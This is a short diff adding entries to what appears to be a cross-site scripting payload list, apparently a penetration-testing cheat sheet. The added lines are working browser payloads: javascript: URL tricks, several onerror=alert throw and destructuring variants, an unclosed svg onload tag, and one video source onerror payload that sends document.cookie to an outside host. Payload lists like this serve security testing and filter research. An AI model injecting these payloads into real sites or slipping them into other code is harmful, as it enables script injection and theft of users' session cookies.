@@ -1448,7 +1448,8 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <form><input type=submit formaction=javascript:alert(1) value=XSS>
 <form action=javascript:alert(1)><input type=submit value=XSS>
 <svg><use href=\"//subdomain1.portswigger-labs.net/use_element/upload.php#x\" /></svg>
-<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS</text></a>
+<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS<\/text><\/a>
+<a href=\"javascript:\/\/%0aalert(1)\">XSS<\/a>
 <script>onerror=alert;throw 1<\/script>
 <script>{onerror=alert}throw 1<\/script>
 <script>throw onerror=alert,1<\/script>
@@ -1461,6 +1462,11 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <script>alert`1`<\/script>
 <script>new Function`X${document.location.hash.substr`1`}`<\/script>
 <script>Function`X${document.location.hash.substr`1`}```<\/script>
+<video><source onerror=location=/\\02.rs/+document.cookie>
+<svg onload=alert(1) 
+<script>throw[onerror]=[alert],1<\/script>
+<script>var{a:onerror}={a:alert};throw 1<\/script>
+<script>var{haha:onerror=alert}=0;throw 1<\/script>
 <meta http-equiv=\"refresh\" content=\"0; url=\/\/portswigger-labs.net\">
 <meta charset=\"UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
 <meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
